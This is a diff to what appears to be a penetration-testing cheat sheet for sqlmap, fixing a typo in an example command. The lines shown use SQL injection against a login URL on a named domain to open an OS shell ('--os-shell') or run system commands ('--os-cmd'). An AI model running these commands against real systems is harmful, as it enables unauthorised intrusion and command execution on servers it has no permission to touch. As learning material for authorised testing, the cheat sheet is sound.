@@ -156,7 +156,7 @@ sqlmap -u http://imranparray.com/login.php?id=100 --os-shell
 
 __Os Command Exe without Shell Upload__
 ```console
-sqlmap -u http://imranparray.com/login.php?id=100 --os-cmd "uanme -a"
+sqlmap -u http://imranparray.com/login.php?id=100 --os-cmd "uname -a"
 ```
 
 __Using Proxy__
